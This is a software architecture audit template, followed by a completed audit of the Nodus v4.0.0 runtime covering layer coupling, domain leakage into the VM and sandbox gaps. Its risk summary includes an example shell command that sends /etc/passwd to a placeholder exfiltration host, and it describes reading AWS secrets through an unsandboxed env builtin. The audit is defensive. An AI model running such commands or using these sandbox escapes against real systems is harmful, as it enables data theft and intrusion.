# Boundary Integrity Audit

**Objective:** Determine whether the runtime/compiler core is clean — containing only
infrastructure — or whether product logic, domain concepts, or application-specific
behavior have leaked into layers that should be neutral.

Applies to: any language runtime with declared internal layers (frontend, compiler,
VM, stdlib, embedding API).

---

## What "contamination" means

A clean runtime layer contains only things that are true regardless of what programs
are written in the language. Contamination is any code that:

- Names a specific domain (e.g. "agent", "task", "approval", "tenant", "user")
- Assumes a specific deployment topology (e.g. "database", "queue", "HTTP server")
- Makes decisions on behalf of the user program that the user program should make
- Encodes policy that belongs in the application layer, not the language layer

---

## Section 1 — Dependency Direction

Identify the declared layers (e.g. lexer → parser → compiler → VM → builtins →
stdlib → embedding). For each real import in the codebase, verify the direction.

- Does any lower layer import from a higher layer?
- Does the VM import from stdlib?
- Does the compiler import from the embedding API?
- Does the lexer import from the VM?

List any violations found. Format: `[lower_module] imports [higher_module] — reason this matters`.

**Verdict:** Clean | Minor upward import | Structural inversion

---

## Section 2 — Domain Language in Core

Search the compiler and VM source for domain-specific nouns.

Scan for: identifiers, class names, function names, variable names, docstrings, and
comments that name application concepts rather than language concepts.

Language-neutral terms (acceptable in core): `value`, `frame`, `opcode`, `scope`,
`token`, `node`, `register`, `coroutine`, `error`, `result`, `type`.

Domain-specific terms (signal contamination if found in core): names of the
application's problem domain, proper nouns from any specific industry or use case,
names that would not appear in the CPython or V8 source.

List any found: `[identifier]` in `[file:line]` — domain contamination? YES/NO — why.

**Verdict:** None found | Isolated in stdlib | Present in VM or compiler

---

## Section 3 — Runtime Neutrality

Does the runtime behave differently based on deployment context in ways that are
not controlled by the script or the embedding API?

- Does the VM read environment variables that alter execution semantics?
- Does any builtin have behavior that depends on the host machine's state in
  undocumented ways?
- Does behavior differ between CLI and embedded mode in ways not exposed to scripts?
- Are there hardcoded paths, URLs, or service names in the core runtime?

List any found.

**Verdict:** Fully neutral | Context-sensitive with documented escapes | Implicit ambient dependency

---

## Section 4 — Data Model Purity

Does the VM's data model (types, values, frames) contain application-specific fields?

- Do value types carry metadata that only makes sense in one deployment context?
- Does the execution frame carry fields that belong in application state?
- Are there special-cased types that are not first-class language types?

**Verdict:** Pure | Minor special-casing | Structural leakage

---

## Section 5 — API Contract Stability

Does the embedding API expose internal types that callers then depend on?

- Does the public embedding API return VM-internal objects (frames, opcodes, internal
  value wrappers)?
- Are there methods on the public API that only make sense for a specific host
  application pattern?
- Is any method marked `_private` but used outside its module?

List any violations.

**Verdict:** Clean surface | Leaky internals | No real boundary

---

## Section 6 — Plugin / Extension Boundary

If an extension/plugin system exists:

- Can a plugin read or mutate VM-internal state directly?
- Does the plugin API expose things that should be internal (frame stack, opcode
  stream, GC roots)?
- Is there a documented contract for what plugins may access?
- Is there a version marker that lets the runtime warn on ABI mismatch?

**Verdict:** Clean contract | Overly broad access | No boundary

---

## Section 7 — Legacy / Dead Infrastructure

Identify code that exists only for historical reasons and now represents a liability.

- Are there deprecated APIs still called from within the codebase?
- Are there two implementations of the same thing where only one should exist?
- Are there files or modules with no callers?
- Are there TODO/FIXME comments that reveal known but unresolved design debt?

Count: ___ deprecated call sites, ___ orphan modules, ___ unfixed TODOs in core.

**Verdict:** Acceptable | Needs scheduled removal | Blocking clean separation

---

## Section 8 — Capability Ownership

Who decides what a script is allowed to do?

- Is capability enforcement (filesystem access, network, subprocess) in the core,
  in the embedding API, in the stdlib, or in the application?
- Is it possible for a script to escalate past the enforcement layer?
- Is the same capability enforced consistently across CLI and embedded modes?

Describe exactly where enforcement lives and whether it is escapable.

**Verdict:** Correctly owned | Partially enforced | Enforcement absent or bypassable

---

## Violations Table

Summarize all violations found across all sections.

| Location | Section | Contamination | Severity (Low/Med/High/Critical) |
|----------|---------|---------------|----------------------------------|
| | | | |

---

## Risk Summary

- **Refactoring risk:** Is the contamination incidental (easy to extract) or structural
  (would require redesigning the layer boundary)?
- **Stability risk:** Do embedders depend on the leaked types/behavior? Removing them
  would be a breaking change?
- **Security risk:** Does any contamination create a path for capability escalation?

---

## Final Classification

| Classification | Criteria |
|----------------|----------|
| **Clean runtime** | No contamination in core layers; any domain concepts confined to optional stdlib modules |
| **Minor residual coupling** | Domain names or concepts found in stdlib only; core layers clean |
| **Significant contamination** | Domain concepts in VM or compiler; embedding API exposes internal types |
| **Product masquerading as runtime** | Core layers are organized around a specific application; not separable without a rewrite |

**Classification:** ___

**Recommended priority:** Low / Medium / High / Blocking

**Confidence:** High / Medium / Low — and why.

---

**Rules:**
- Cite actual file paths and line numbers for violations.
- Do not suggest redesigns.
- Do not assess intent — report what the code does.
- Confidence is lower if large files were sampled rather than fully read.





Boundary Integrity Audit — Nodus v4.0.0 Runtime - 6/6/26- 11:28pm 

  Audit Scope: src/nodus/ + src/nodus_lang_workflow/
  Question: Is the runtime/compiler core clean (infrastructure only), or have domain concepts leaked into neutral layers?

  ---
  Section 1 — Dependency Direction

  Expected: Lexer → Parser → Compiler → VM → Builtins → Services (one-way downward). Runtime layers import from lower layers only.

  Findings:

  ┌────────────────────────┬───────────────────────────────────────────────────────────┬────────────────────────────────────────────────────────────────┐
  │       Direction        │                         Violation                         │                            Evidence                            │
  ├────────────────────────┼───────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────┤
  │ Upward: frontend →     │ frontend/parser.py imports runtime/diagnostics.py         │ parser.py:3 — from nodus.runtime.diagnostics import            │
  │ runtime                │                                                           │ LangRuntimeError                                               │
  ├────────────────────────┼───────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────┤
  │ Upward: frontend →     │ frontend/lexer.py imports runtime/diagnostics.py          │ Same pattern                                                   │
  │ runtime                │                                                           │                                                                │
  ├────────────────────────┼───────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────┤
  │ Horizontal: compiler → │ compiler/compiler.py imports                              │ compiler.py:61 — from nodus.orchestration.workflow_lowering    │
  │  orchestration         │ orchestration/workflow_lowering.py                        │ import lower_goal_ast, lower_workflow_ast                      │
  ├────────────────────────┼───────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────┤
  │ Downward: builtins →   │ 11 builtin modules import VM, Record, Closure from        │ builtins/*.py — e.g., from nodus.vm.vm import Record, Closure  │
  │ vm internals           │ vm/vm.py                                                  │                                                                │
  ├────────────────────────┼───────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────┤
  │ Circular: vm ↔         │ vm/vm.py ↔ nodus_lang_workflow/runner.py                  │ vm.py:1131, 1161, 1174, 1194 — deferred imports marked # noqa: │
  │ workflow               │                                                           │  E402                                                          │
  ├────────────────────────┼───────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────┤
  │ Lateral: runtime →     │ scheduler.py accesses vm.code_locs and vm.source_path     │ scheduler.py:76–77 — self.vm.code_locs[...],                   │
  │ module_loader          │ directly                                                  │ self.vm.source_path                                            │
  ├────────────────────────┼───────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────┤
  │ Lateral: orchestration │ task_graph.py maintains _GRAPH_VMS: dict[str, object]     │ task_graph.py:52                                               │
  │  → vm                  │ mapping graph IDs to live VM instances                    │                                                                │
  └────────────────────────┴───────────────────────────────────────────────────────────┴────────────────────────────────────────────────────────────────┘

  Verdict: The dependency graph is not a DAG. Frontend imports runtime (upward). Compiler imports orchestration (horizontal). Builtins are coupled to VM
  internals. There is a live circular dependency between the VM and the workflow runner. Direction violations: 7.

  ---
  Section 2 — Domain Language in Core

  Expected: The VM is a pure execution engine. Domain terms (workflow, tool, agent, memory) belong in optional service or stdlib layers.

  Findings in vm/vm.py constructor (lines 270–310):

  self.memory_store = GLOBAL_MEMORY_STORE     # application service
  self.effect_store = InMemoryEffectStore()   # application service
  self.circuit_breakers = {}                  # application pattern
  self.session_id = session_id                # session management
  self.trace_id = trace_id                    # distributed tracing
  self.tool_registry: dict = {}               # tool dispatch table
  self._tool_registry_lock = threading.RLock()
  self.test_state = test_state                # test instrumentation
  self.last_graph_plan = None                 # orchestration artifact

  Domain builtins hardwired into self.builtins dispatch table (lines 334–359):

  - Workflow layer: run_workflow, plan_workflow, resume_workflow, workflow_state, workflow_wait, current_workflow_id, __workflow_checkpoint
  - Goal/planning layer: run_goal, plan_goal, resume_goal
  - Tool layer: tool_call, tool_available, tool_describe, __action_tool
  - Agent layer: agent_call, agent_available, agent_describe, __action_agent
  - Memory layer: __action_memory_put, __action_memory_get
  - Syscall layer: syscall, syscall_list
  - Emit: __action_emit

  Event enrichment runtime_adapter_event_data() at vm.py:1356: The VM's event emission mechanism directly enriches every event with workflow_id, goal_id,
  step_name, graph_id, session_id, trace_id — domain orchestration state embedded into the core instrumentation path.

  Count: 9 domain-specific constructor fields, 23 domain-specific builtins, 6 domain-specific event enrichment fields.

  Verdict: The VM is not a neutral execution engine. It is a domain-aware orchestration host. Domain concepts are not wired in via an optional service layer
  — they are first-class fields of the VM constructor and directly dispatched from the builtin table. Contamination: pervasive.

  ---
  Section 3 — Runtime Neutrality

  Expected: The runtime layer contains no application-specific configuration or policy. Behavior is determined by caller-supplied parameters only.

  Findings:

  ┌───────────────────────────────────┬────────────────────────────────────────────────────────────────┬────────────────────────────────────────────────┐
  │             Location              │                           Violation                            │                     Impact                     │
  ├───────────────────────────────────┼────────────────────────────────────────────────────────────────┼────────────────────────────────────────────────┤
  │ module_loader.py:677              │ os.environ.get("NODUS_PROJECT_ROOT") alters import resolution  │ Scripts can read env to influence which        │
  │                                   │                                                                │ modules they load                              │
  ├───────────────────────────────────┼────────────────────────────────────────────────────────────────┼────────────────────────────────────────────────┤
  │ vm/vm.py constructor              │ from nodus.services.memory_runtime import GLOBAL_MEMORY_STORE  │ Module-level singleton binds all VM instances  │
  │                                   │ pulled at import time                                          │ to the same memory namespace at import         │
  ├───────────────────────────────────┼────────────────────────────────────────────────────────────────┼────────────────────────────────────────────────┤
  │ embedding.py:233                  │ timeout_ms=None default (CLI default is 200ms)                 │ Runtime layer and CLI layer apply different    │
  │                                   │                                                                │ policies to the same execution path            │
  ├───────────────────────────────────┼────────────────────────────────────────────────────────────────┼────────────────────────────────────────────────┤
  │ nodus_lang_workflow/runner.py:773 │ get_default_workflow_runner() returns LocalWorkflowStore by    │ Persistence policy is hardwired in the runtime │
  │                                   │ default, not SQLiteWorkflowStore                               │  layer, not passed by the caller               │
  └───────────────────────────────────┴────────────────────────────────────────────────────────────────┴────────────────────────────────────────────────┘

  Verdict: The runtime layer reads environment variables to configure itself, hard-codes service defaults, and applies different resource policies depending
  on entry point. It is not neutral. 3 neutrality violations.

  ---
  Section 4 — Data Model Purity

  Expected: The VM's internal state represents only execution state: instruction pointer, stack, locals, open frames. Application state is held externally.

  Actual VM state (constructor fields):

  ┌────────────────────────────────────┬────────────────────────┬───────────────────────┐
  │               Field                │        Category        │ Appropriate location  │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ ip, stack, frames, locals          │ Execution state        │ VM ✓                  │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ code, code_locs, constants         │ Bytecode               │ VM ✓                  │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ deadline, max_steps, step_count    │ Resource limits        │ VM ✓                  │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ scheduler                          │ Coroutine management   │ VM (borderline) ✓     │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ memory_store                       │ Application service    │ Service layer ✗       │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ effect_store                       │ Application service    │ Service layer ✗       │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ tool_registry, _tool_registry_lock │ Application service    │ Service layer ✗       │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ circuit_breakers                   │ Application pattern    │ Service layer ✗       │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ session_id                         │ Session management     │ Embedding API ✗       │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ trace_id                           │ Distributed tracing    │ Embedding API ✗       │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ test_state                         │ Test instrumentation   │ Test framework ✗      │
  ├────────────────────────────────────┼────────────────────────┼───────────────────────┤
  │ last_graph_plan                    │ Orchestration artifact │ Orchestration layer ✗ │
  └────────────────────────────────────┴────────────────────────┴───────────────────────┘

  Verdict: 9 of the VM's state fields carry application-domain data that belongs outside the execution engine. The VM object has fused the role of bytecode
  interpreter, service locator, session manager, and test harness. Data model is impure.

  ---
  Section 5 — API Contract Stability

  Expected: Public API exports only stable, intentional types. Internal implementation types are hidden.

  Findings:

  ┌────────────────────────────────────────────────────────────────────────────────────────────────────────┬────────────────────────────────────────────┐
  │                                                Exposure                                                │                    Risk                    │
  ├────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────────────┤
  │ embedding.py:302: last_vm: VM | None = None — VM (internal type) exposed as public field               │ Any caller can access the live VM and      │
  │                                                                                                        │ mutate internal state                      │
  ├────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────────────┤
  │ embedding.py:17: imports VM, Record, Closure from vm/vm.py — re-exports internal types                 │ Tight coupling from the public API to VM   │
  │                                                                                                        │ internals                                  │
  ├────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────────────┤
  │ tooling/loader.py:613: run_source() deprecated "will be removed in v4.0" — still exposed via           │ Deprecated surface still callable in v4.0  │
  │ nodus.__init__.__getattr__                                                                             │                                            │
  ├────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────────────┤
  │ legacy_error_dict() at runtime/errors.py:110 — still called from embedding.py:627 and                  │ Legacy shape still on the critical path    │
  │ tooling/runner.py:103                                                                                  │                                            │
  ├────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────────────┤
  │ embedding.py:343–344: register_function() rejects names in BUILTIN_NAMES — the set is determined by VM │ Public API boundary controlled by VM       │
  │  internals, not the public API contract                                                                │ internals                                  │
  └────────────────────────────────────────────────────────────────────────────────────────────────────────┴────────────────────────────────────────────┘

  Verdict: The public embedding API leaks VM, Record, and Closure as typed references. Callers with last_vm access can mutate live execution state. The API
  contract is partially determined by VM internal implementation details. Stability risk: medium-high.

  ---
  Section 6 — Plugin/Extension Boundary

  Expected: The core VM has a clean, documented hook for adding builtins. Domain capabilities are added through that hook, not hardwired into the VM.

  Findings:

  - embedding.py:343: register_function() provides a programmatic hook for adding host functions. The hook validates names against BUILTIN_NAMES and raises
  ValueError for conflicts.
  - However: The 23 domain-specific builtins (workflow, tool, agent, memory, syscall) are NOT registered via register_function(). They are registered
  directly in vm.py:334–359 inside the VM constructor with no indirection layer.
  - There is no ExtensionPoint, BuiltinProvider, or interface that allows the domain builtins to be treated as first-class plugins with the same
  registration path as user extensions.

  Verdict: The plugin boundary exists for external embedders (register_function) but is bypassed entirely by the core domain capabilities, which are
  hardwired. The VM makes no structural distinction between "language primitive" and "domain service." Plugin boundary: partial, inconsistently applied.

  ---
  Section 7 — Legacy / Dead Infrastructure

  Expected: The codebase contains no deprecated API still on the active execution path, no commented-out code blocks active in critical paths, no "to be
  removed" stubs still wired.

  Findings:

  ┌─────────────────────────────────┬──────────────────────────────────────────────────────────────┬────────────────────────────────────────────────────┐
  │              Item               │                            Status                            │                      Location                      │
  ├─────────────────────────────────┼──────────────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
  │ tooling/loader.py::run_source() │ Deprecated, scheduled for removal "in v4.0", still in        │ tooling/loader.py:613, nodus/__init__.py lazy      │
  │                                 │ __getattr__                                                  │ export                                             │
  ├─────────────────────────────────┼──────────────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
  │ legacy_error_dict()             │ "Legacy" in the name, still on the primary error return path │ runtime/errors.py:110, called from                 │
  │                                 │                                                              │ embedding.py:627, tooling/runner.py:103            │
  ├─────────────────────────────────┼──────────────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
  │ CIRC-001 deferred imports       │ 4 # noqa: E402 suppressions in vm.py:1131, 1161, 1174, 1194  │ vm/vm.py                                           │
  │                                 │ — workaround for unfixed circular dep                        │                                                    │
  ├─────────────────────────────────┼──────────────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
  │ compile_source() in compiler.py │ Marked deprecated, replaced by compile_module()              │ compiler.py                                        │
  └─────────────────────────────────┴──────────────────────────────────────────────────────────────┴────────────────────────────────────────────────────┘

  Count: 4 distinct legacy items, 2 of which are on the active execution path (not just importable but actually called during normal execution).

  Verdict: The "v4.0" deprecation target has been missed for run_source(). legacy_error_dict() is load-bearing — removing it would require coordinated
  changes across embedding.py and tooling/runner.py. Cleanup debt: low-medium volume, but 2 items are on the hot path.

  ---
  Section 8 — Capability Ownership

  Expected: Sandbox enforcement is consistently owned by one layer. Capabilities granted to scripts (filesystem, network, process, environment) are
  uniformly enforced at that layer boundary.

  Findings:

  ┌──────────────────┬───────────────────────────────────────────────────┬─────────────────────────────────────────────────────────────────────────────┐
  │    Capability    │                    Enforcement                    │                                     Gap                                     │
  ├──────────────────┼───────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
  │ Filesystem       │ vm._ensure_path_allowed() called in all file      │ None — correctly owned by VM                                                │
  │ read/write       │ builtins                                          │                                                                             │
  ├──────────────────┼───────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
  │ Process          │ vm._ensure_path_allowed(cwd, ...) called for cwd  │ Gap: The subprocess command itself (binary path) is NOT checked. A script   │
  │ subprocess       │ and redirect paths                                │ can execute /bin/sh regardless of allowed_paths.                            │
  ├──────────────────┼───────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
  │ HTTP/network     │ None                                              │ Gap: http_module.py makes outbound requests with no sandbox check.          │
  ├──────────────────┼───────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
  │ Environment      │ None                                              │ Gap: env.py exposes full os.environ read/write/delete regardless of         │
  │ variables        │                                                   │ allowed_paths.                                                              │
  ├──────────────────┼───────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
  │ Memory           │ vm._ensure_path_allowed() not applicable          │ No concept of memory sandbox — GLOBAL_MEMORY_STORE is shared across all     │
  │                  │                                                   │ tenants                                                                     │
  └──────────────────┴───────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────┘

  Ownership coherence: Filesystem is enforced in the VM. The subprocess gap means a sandboxed script can trivially escape via shell. HTTP and env caps are
  unowned — no layer enforces them. The allowed_paths parameter creates a false impression of sandbox completeness.

  Verdict: Capability ownership is fragmented and incomplete. Filesystem enforcement is consistent; subprocess, network, and environment enforcement is
  absent. A script operating under a strict allowed_paths constraint can still exfiltrate data via HTTP or read sensitive environment variables. Security
  posture: filesystem only.

  ---
  Violations Table

  ┌───────┬──────────────────────┬────────────────────────────────────────────────────────────────────┬──────────┬──────────────────────────────────────┐
  │  ID   │       Section        │                             Violation                              │ Severity │               Location               │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-01 │ Dependency Direction │ Frontend imports runtime (upward)                                  │ Medium   │ frontend/parser.py:3,                │
  │       │                      │                                                                    │          │ frontend/lexer.py                    │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-02 │ Dependency Direction │ Compiler imports orchestration (horizontal)                        │ Medium   │ compiler/compiler.py:61              │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-03 │ Dependency Direction │ Builtins import VM internals (Record, Closure)                     │ High     │ builtins/*.py (11 files)             │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-04 │ Dependency Direction │ Circular: vm/vm.py ↔ nodus_lang_workflow/runner.py                 │ High     │ vm.py:1131,1161,1174,1194            │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-05 │ Dependency Direction │ task_graph.py maintains process-level VM registry                  │ Medium   │ task_graph.py:52                     │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-06 │ Domain in Core       │ VM constructor carries 9 domain-specific fields                    │ High     │ vm/vm.py:270–310                     │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-07 │ Domain in Core       │ 23 domain builtins hardwired into VM dispatch                      │ High     │ vm/vm.py:334–359                     │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-08 │ Domain in Core       │ Event enrichment embeds domain fields into core instrumentation    │ Medium   │ vm/vm.py:1356                        │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-09 │ Runtime Neutrality   │ module_loader.py reads NODUS_PROJECT_ROOT env var                  │ Low      │ module_loader.py:677                 │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-10 │ Runtime Neutrality   │ GLOBAL_MEMORY_STORE singleton bound at import time                 │ High     │ memory_runtime.py:47                 │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-11 │ Runtime Neutrality   │ CLI and embedding defaults differ (200ms vs None)                  │ Medium   │ embedding.py:233                     │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-12 │ Data Model Purity    │ VM is fused execution engine + service locator + session manager + │ High     │ vm/vm.py constructor                 │
  │       │                      │  test harness                                                      │          │                                      │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-13 │ API Contract         │ last_vm: VM exposes internal type publicly                         │ Medium   │ embedding.py:302                     │
  │       │ Stability            │                                                                    │          │                                      │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-14 │ API Contract         │ legacy_error_dict() still on active error path                     │ Low      │ errors.py:110, embedding.py:627      │
  │       │ Stability            │                                                                    │          │                                      │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-15 │ Plugin Boundary      │ Domain builtins bypass register_function() hook                    │ Medium   │ vm/vm.py:334–359                     │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-16 │ Legacy               │ run_source() deprecated "in v4.0", still exported                  │ Low      │ tooling/loader.py:613                │
  │       │ Infrastructure       │                                                                    │          │                                      │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-17 │ Capability Ownership │ Subprocess command not path-sandboxed                              │ Critical │ subprocess_module.py:150,164         │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-18 │ Capability Ownership │ HTTP calls unsandboxed                                             │ High     │ http_module.py                       │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-19 │ Capability Ownership │ env builtin: full os.environ access, no sandbox                    │ High     │ env.py                               │
  ├───────┼──────────────────────┼────────────────────────────────────────────────────────────────────┼──────────┼──────────────────────────────────────┤
  │ BI-20 │ Capability Ownership │ GLOBAL_MEMORY_STORE shared across all tenants (no isolation)       │ High     │ memory_runtime.py:47                 │
  └───────┴──────────────────────┴────────────────────────────────────────────────────────────────────┴──────────┴──────────────────────────────────────┘

  Total violations: 20 across 8 audit sections.

  ---
  Risk Summary

  Refactoring risk — High
  The VM is the single most changed file in the codebase (2,744 lines, 46+ import statements). Any attempt to extract domain services out of the VM requires
  changes to: the VM constructor, all 11 builtin modules that import VM internals, the module loader, the orchestration layer, the embedding API, and the
  workflow runner. The circular dependency between vm.py and nodus_lang_workflow/runner.py means the extraction path requires breaking the circular dep
  first, which itself has been deferred since the pre-CIRC-001 era.

  Stability risk — Medium
  last_vm: VM makes the internal VM type a de-facto public API surface. Any caller who uses it (including nodus-mcp, nodus-extension, nodus-sdk) must be
  updated if VM's fields change. The legacy_error_dict() call on the error return path similarly constrains refactoring of the error model.

  Security risk — Critical for multi-tenant / sandboxed deployment
  The sandbox gaps (BI-17, BI-18, BI-19) mean that allowed_paths enforcement is incomplete. A script author who knows the implementation can:
  1. Execute /bin/sh -c "curl http://exfil.example.com/$(cat /etc/passwd)" — bypasses both path and network sandbox in one subprocess call
  2. Read os.environ["AWS_SECRET_ACCESS_KEY"] or any other process-level secret via the env builtin
  3. Make arbitrary HTTP requests regardless of allowed_paths configuration

  These are not theoretical: they require only that the script author know which builtins are unsandboxed.

  Multi-tenant isolation risk — High
  GLOBAL_MEMORY_STORE and AGENT_REGISTRY are process-level singletons with no namespace scoping. In a server deployment running multiple NodusRuntime
  instances (e.g., nodus-sdk FastAPI bridge), all scripts share the same memory namespace and agent registry. Script A can read or overwrite memory written
  by Script B.

  ---
  Final Classification

  Classification: Significant Contamination — Structural

  The runtime core is not neutral infrastructure. Domain concepts (workflow, tool, agent, memory, syscall, circuit-breakers, sessions, tracing) are present
  at the VM layer as first-class constructor fields and hardwired builtin dispatch entries. This is not incidental leakage from one or two files — it is the
  designed-in structure of the VM: the VM is the service locator for all application services.

  The compiler layer imports the orchestration layer, meaning workflow/goal semantics are resolved at compile time rather than being late-bound through a
  clean abstraction.

  Sandbox enforcement is inconsistently owned: filesystem enforcement exists, but subprocess command, network, and environment access are unowned by any
  security boundary.

  Priority: High — pre-publication blocker for multi-tenant embedding use cases

  The sandbox gaps (BI-17–19) and multi-tenant isolation failures (BI-20, BI-10) mean that the security posture described in
  docs/governance/SECURITY_POSTURE.md cannot be delivered by the current implementation for any deployment where scripts from different trust levels share a
  process. This needs to be either fixed before publication or prominently documented as a known limitation with specific deployment guidance.

  The structural contamination (BI-06 through BI-12) is the correct categorization but is lower publication priority — it affects maintainability and the
  refactoring roadmap, not the security surface directly. It is the root cause of the multi-tenant isolation problem but would require a multi-phase
  refactor to resolve.




